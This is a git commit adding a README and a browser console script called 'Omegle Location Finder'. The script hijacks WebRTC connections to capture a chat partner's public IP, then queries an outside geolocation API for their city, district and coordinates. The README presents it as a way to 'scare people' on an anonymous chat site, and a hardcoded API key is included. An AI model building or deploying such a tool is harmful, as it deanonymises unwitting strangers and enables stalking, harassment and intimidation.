2bc388979b7be396c33e7ed0da345deb729ac4fe
Zachary Snell <zacharysnell@outlook.com>
2021-02-23 06:13:59 -0500

    Initial commit

---
+++ README.md
@@ -0,0 +1,11 @@
+#Omegle Location Finder#
+##Finds the location of the person you are chatting with, in real time!##
+
+###How to use###
+* `git clone https://github.com/sh4d0wph03n1x/omegle-location.git`
+* Open in text editor
+* Go to ipgeolocate.io and sign up
+* Copy API key into program
+* Copy whole program
+* Paste into console on browser
+* Scare people's asses off!
---
+++ omeglelogger.js
@@ -0,0 +1,39 @@
+const apiKey = "708e14ca48c54cbaa72a6b663e8109a2";
+
+window.oRTCPeerConnection =
+  window.oRTCPeerConnection || window.RTCPeerConnection;
+
+window.RTCPeerConnection = function (...args) {
+  const pc = new window.oRTCPeerConnection(...args);
+
+  pc.oaddIceCandidate = pc.addIceCandidate;
+
+  pc.addIceCandidate = function (iceCandidate, ...rest) {
+    const fields = iceCandidate.candidate.split(" ");
+    const ip = fields[4];
+    if (fields[7] === "srflx") {
+      getLocation(ip);
+    }
+    return pc.oaddIceCandidate(iceCandidate, ...rest);
+  };
+  return pc;
+};
+
+const getLocation = async (ip) => {
+  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
+
+  await fetch(url).then((response) =>
+    response.json().then((json) => {
+      const output = `
+        ------------------
+        Country: ${json.country_name}
+        State: ${json.state_prov}
+        City: ${json.city}
+        District: ${json.district}
+        Lat / Long: (${json.latitude}, ${json.longitude})
+        -------------------
+        `;
+        console.log(output);
+      })
+    );
+  };
